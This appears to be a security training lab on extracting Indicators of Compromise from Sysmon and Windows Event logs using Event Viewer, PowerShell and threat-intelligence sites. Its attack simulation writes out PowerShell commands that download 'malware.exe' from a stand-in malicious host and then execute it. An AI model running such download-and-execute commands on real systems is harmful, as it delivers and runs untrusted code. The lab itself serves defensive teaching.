# **Task #5: Extract IOCs (Indicators of Compromise) from a Security Incident**

## **Objective**  
The objective of this task is to help students extract **Indicators of Compromise (IOCs)** from a **Windows security incident** by analyzing system logs. By completing this task, students will learn how to identify **malicious IPs, file hashes, registry changes, and process executions** associated with an attack.

---

## **Lab Setup**  
### **Requirements**  
- **System:** Windows 10/11 or Windows Server 2019/2022  
- **Tools Required:**  
  - **Windows Event Viewer**  
  - **Sysmon (System Monitor) from Sysinternals**  
  - **PowerShell**  
  - **VirusTotal / AbuseIPDB (For IOC investigation)**  

---

## **Preparation**  
### **Step 1: Install and Configure Sysmon (If Not Installed)**  
1. Download **Sysmon** from Microsoft Sysinternals:  
   [https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)  
2. Extract the Sysmon ZIP file.  
3. Open **Command Prompt (Run as Administrator)** and install Sysmon with logging enabled:  
   ```powershell
   sysmon -accepteula -i
    ```
4. Verify installation by checking for Sysmon logs in Event Viewer:
```
Applications and Services Logs → Microsoft → Windows → Sysmon → Operational
```

## Attack Simulation & Detection
We will now simulate a security incident, extract IOCs, and analyze logs.

### Step 1: Simulate Malicious Activity
1. Open PowerShell (Run as Administrator).

2. Execute the following command to simulate a malicious script execution:

```
Invoke-WebRequest -Uri "http://malicious-site.com/malware.exe" -OutFile "C:\Users\Public\malware.exe"
```
- This command downloads a file from a remote source, a common malware delivery technique.

3. Execute the downloaded file to simulate an infection:

```
Start-Process "C:\Users\Public\malware.exe"
```
- This mimics an attacker executing malware on a compromised system.

### Step 2: Extract IOCs Using Windows Event Viewer
1. Open Event Viewer (Win + R, type eventvwr.msc, press Enter).

2. Navigate to:
```
Applications and Services Logs → Microsoft → Windows → Sysmon → Operational
```
3. Click Filter Current Log and enter:
- Event ID 1 (Process Creation) → Identifies malware.exe execution.
- Event ID 3 (Network Connection) → Shows outbound connections to malicious IPs.
- Event ID 11 (File Creation) → Captures the dropped malware file.
- Event ID 13 (Registry Modification) → Detects persistence mechanisms.

4. Extract the following IOCs:
- File Path: Where malware.exe was stored (C:\Users\Public\malware.exe).
- Process Name: malware.exe.
- Remote IP Address: The attacker’s C2 (Command & Control) server.
- Registry Key Modifications: Any changes related to persistence.

### Step 3: Extract IOCs Using PowerShell
Instead of using Event Viewer, use PowerShell to extract IOCs:

**Check for Malicious Process Execution (Event ID 1)**
```
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" | Where-Object {$_.Id -eq 1 -and $_.Message -like "*malware.exe*"} | Select-Object TimeCreated, Message | Format-Table -AutoSize
```
- This retrieves all instances where malware.exe was executed.

**Check for Network Connections (Event ID 3)**
```
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" | Where-Object {$_.Id -eq 3} | Select-Object TimeCreated, Message | Format-Table -AutoSize
```
- This extracts all network connections, revealing the remote attacker's IP.

**Check for File Creation Events (Event ID 11)**
```
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" | Where-Object {$_.Id -eq 11} | Select-Object TimeCreated, Message | Format-Table -AutoSize
```
- This identifies suspicious files created on disk.

### Step 4: Investigate Extracted IOCs
1. Copy any malicious IPs, file hashes, or domains identified.
2. Check them on Threat Intelligence Platforms:
- VirusTotal → Check if the file or domain is flagged as malicious.
- AbuseIPDB → Verify if the remote IP is blacklisted.
- Hybrid Analysis → Look for behavior analysis of malware.exe.
3. If confirmed malicious, recommend blocking the IPs/domains and quarantining the infected file.

## Conclusion
✅ Successfully simulated a malicious file execution and network communication.   
✅ Extracted Indicators of Compromise (IOCs) from Sysmon and Windows Event Logs.   
✅ Investigated malicious domains, IPs, and file hashes using threat intelligence.   
✅ Learned how SOC analysts collect IOCs and use them for threat hunting.   

## Submission
- Share a screenshot of Sysmon logs showing the identified IOCs (Event ID 1, 3, or 11).
- Write a short observation on how IOC extraction helps in identifying and mitigating security threats.

